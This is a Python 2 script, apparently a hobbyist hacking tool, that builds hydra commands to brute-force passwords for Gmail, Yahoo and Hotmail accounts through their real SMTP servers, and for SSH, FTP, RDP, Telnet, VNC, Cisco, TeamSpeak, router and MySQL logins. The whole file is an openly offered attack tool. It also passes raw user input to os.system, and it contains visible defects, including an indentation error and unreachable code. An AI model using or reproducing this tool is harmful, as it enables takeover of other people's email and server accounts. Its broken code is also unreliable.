#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")
print "Deiri"
print "Gmail"
print "BruteFoce"
print "[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
print " [*] Author: Deiri  ---  [*] Version 1.0"
print "c=={:::::::::::::::> Brute Force Console"
print " [*] Brute Gmail"
print "(}xxx{):::::::::> good luck"
print
print "              ===|[ Deiri Brute Force ]|==="
print
print " [01] Gmail Brute Force         "
print
print " [00] Exit"
print
bhydra = raw_input("[*] B-Hydra > ")

if bhydra == '0u1' or bhydra == 'u1':
  print
  print "          +---------------------------+"
  print "          |     Cisco Brute Force     |"
  print "          +---------------------------+"
  print
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif bhydra == '0u2' or bhydra == 'u2':
  print
  print "          +---------------------------+"
  print "          |      VNC Brute Force      |"
  print "          +---------------------------+"
  print
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif bhydra == '03u' or bhydra == '3u':
  print
  print "          +------------------------------+"
  print "          |        FTP Brute Force       |"
  print "          +------------------------------+"
  print
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif bhydra == '01' or bhydra == '1':
  print
  print "          +------------------------------+"
  print "          |       Gmail Brute Force      |"
  print "          +------------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '0j5' or bhydra == 'j5':
   print
   print "         +--------------------------------+"
   print "         |        SSH Brute Force         |"
   print "         +--------------------------------+"
   print
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif bhydra == '0j6' or bhydra == '6j':
	print
	print "        +-------------------------+"
	print "        |  TeamSpeak Brute Force  |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	sys.exit()

 elif bhydra == '0u7' or bhydra == '7jj':
	print
	print "        +-------------------------+"
	print "        |   Telnet Brute Force    |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '044448' or bhydra == '8443':
  print
  print "          +---------------------------+"
  print "          |     Yahoo Brute Force     |"
  print "          +---------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '03339' or bhydra == '9333':
  print
  print "          +----------------------------+"
  print "          |    Hotmail Brute Force     |"
  print "          +----------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '1330':
	print
	print "        +-----------------------------+"
	print "        |  Router Speedy Brute Force  |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '11333':
	print
	print "        +----------------------------+"
	print "        |      RDP Brute Force       |"
	print "        +----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif bhydra == '122':
	print
	print "        +-----------------------------+"
	print "        |       MySQL Brute Force     |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif bhydra == '00' or bhydra == '0':
	print "\n[!] Exit the Program..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()